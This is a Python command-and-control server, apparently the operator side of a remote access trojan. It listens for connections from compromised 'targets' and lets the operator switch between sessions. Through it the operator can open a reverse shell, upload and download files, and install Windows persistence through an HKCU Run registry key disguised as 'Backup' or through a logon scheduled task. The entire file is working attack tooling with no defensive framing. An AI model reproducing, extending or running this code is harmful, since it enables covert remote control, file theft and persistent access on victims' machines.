import socket
import json
import sys
import time
import random
import threading
import os

HOST = "0.0.0.0" # Address to listen on
PORT = 6969 # Port to listen on. (Better to use unprivileged ports)

connections = list() # List of active connections 

def send_command(conn, *args):
    """Send a command to the target"""
    try:
        conn.send(json.dumps(args).encode())
    except ConnectionResetError as _:
        print("\033[96m[ERROR] The connection with the target was lost\033[0m")

def wait_response(conn):
    """Gets a response from the target"""
    try:
        raw = conn.recv(1024).decode()
    except ConnectionResetError as _:
        print("\033[96m[ERROR] The connection with the target was lost\033[0m")
        return
    data = json.loads(raw)
    return data

def shell(conn): 
    """Actions performed when the shell command is typed"""
    print("\033[96m[INFO] Dropping into a shell...\033[91m")
    time.sleep(0.5)
    port = random.randint(49152, 65525) # Generate a random port for the reverse shell
    send_command(conn, "shell", port)

    lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a new socket for the reverse shell
    lst.bind((HOST, port))
    lst.listen(1)
    cn, _ = lst.accept()
    while True:
        #Receive data from the target and get user input
        try:
            ans = cn.recv(1024).decode(errors='ignore')
        except ConnectionResetError as _:
            print("\033[91m[ERROR] The shell was lost. Returning to C2...\033[0m")
            break
        sys.stdout.write(ans)
        command = input()
        if command == 'exit':
            cn.close()
            print('\033[96m[INFO] Exiting the reverse shell...\033[0m')
            break

        #Send command
        command += "\n"
        try:
            cn.send(command.encode())
        except ConnectionResetError as _:
            print("\033[91m[ERROR] The shell was lost. Returning to C2...\033[0m")
            break
        time.sleep(1)
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

def upload_file(conn, local_path, remote_path):
    print("\033[96m[INFO] Uploading the specified file...\033[0m")
    try:
        f = open(local_path, 'rt')
        content = f.read()
    except FileNotFoundError as _:
        print("\033[91m[ERROR] The specified file does not exist\033[0m")
        return
    except OSError as e:
        print("\033[91m[ERROR] There was an error in the operation\n", e, "\033[0m")
        return

    try:
        send_command(conn, 'upload', content, remote_path)
    except UnboundLocalError as _:
        print("\033[91m[ERROR] The specified file does not exist\033[0m")
        return

    upload_status = wait_response(conn)
    if upload_status == '1':
        print('\033[92m[INFO] File uploaded successfully!\033[0m')
    else:
        print('\033[93m[WARN] There was an error uploading the file. Error:\n', upload_status, '\033[0m\n')

def download_file(conn, remote_path):
    print("\033[96m[INFO] Retrieving the requested file...\033[0m")
    send_command(conn, 'download', remote_path)

    res = wait_response(conn)
    if res == '0':
        print("\033[91m[WARN] The specified file doesn't exist\033[0m")
    elif res == '1':
        print("\033[91m[ERROR] These was a problem downloading the file\n\033[0m")
    else:
        if not os.path.exists('Downloads'):
            os.mkdir('Downloads')
        filename = remote_path.split('\\')[-1]
        f = open('Downloads\\'+filename, 'w')
        f.write(res)
        print("\033[96m[INFO] File successfully downloaded\033[0m")

    
def listen_for_connections(server):
    """Continuously listen for new incoming connections"""
    while True:
        connection, address = server.accept()
        print(f"\033[92m[INFO] Connection received from {address}\033[0m")
        connections.append([connection, address]) # Appends the connection to the connections list

def print_shrek():
    fn = open('../art/ascii_art.txt', 'r')
    print("\033[32m".join([line for line in fn]),"\033[32m")

if __name__ == '__main__':
    print_shrek()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    print(f"\033[92m[INFO] Listening on {HOST}:{PORT}\033[0m")
    server.listen(1)
    # Starting a thread which continuously listens for new connections
    threading.Thread(target=listen_for_connections, args=(server, )).start()
    session = 0 # Current active session. Default is the first session
    while True:
        while True:
            command = input("\033[1mCMD> \033[0m") # Request user command input
            parameters = command.split(' ')
            match parameters[0]: # Parse user command input
                
                case 'help': # Print an help message
                    print("""
                        \n<NOME DEL TOOL> 0.1
                        Usage: CMD> [command] [options]

                        COMMANDS:
                            help: Displays this prompt
                            sessions: Lists all the active sessions
                            session <number>: Select the specified session
                            shell: Opens a reverse shell on the target
                            upload <local_file> <destination_path>: Uploads a specified file (absolute local path)
                            download <remote_file>: Downloads a file from the remote host
                            persistence <mode>: try to set persistence on the target. Multiple options:\n\tregistry: set persistence in HKCU registry\n\tschtask: set a scheduled task for persistence\n
                        """)
                    
                case 'sessions': 
                    i = 0
                    for connection in connections: # Parse all the connections stored to list them
                        print(f"{i} ---- {connection[1]} ----", "\033[92mcurrent\033[0m" if i == session else " ")
                        i += 1

                case 'session':
                    try:
                        connections[int(parameters[1])][1] # Check if the index is out of range
                    except IndexError as _:
                        print("\033[91m[ERROR] The selected session does not exist\033[0m")
                    else:
                        session = int(parameters[1])
                        print(f"Selected session {session} on host {connections[session][1]}")

                case 'shell':
                    shell(connections[session][0])

                case 'upload':
                    upload_file(connections[session][0], parameters[1], parameters[2])

                case 'download':
                    download_file(connections[session][0], parameters[1])

                case 'quit':
                    res = input("Are you sure you want to quit? [Y/n] ")
                    if res.lower() == 'y': 
                        for connection in connections: # Close all the connections
                            connection[0].close()
                        quit() # TODO: check why this blows up everything (probably bc of threads)
                    else:
                        pass

                case 'persistence':
                    print('\033[93m[INFO] Attempting to set up persistence on the target...\033[0m')
                    if parameters[1] == 'registry': # adds a value to Run in HKCU to run the payload at startup
                        send_command(connections[session][0], 'command', 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backup /t REG_SZ /d "'+__file__+'"')
                    elif parameters[1] == 'schtask': # sets a scheduled task which runs at user logon
                        send_command(connections[session][0], 'command', 'schtasks /create /sc ONLOGON /mo ONLOGON /tn ' + __file__)

                case _:
                    print("\033[93m[INFO] Not a valid command\033[0m")

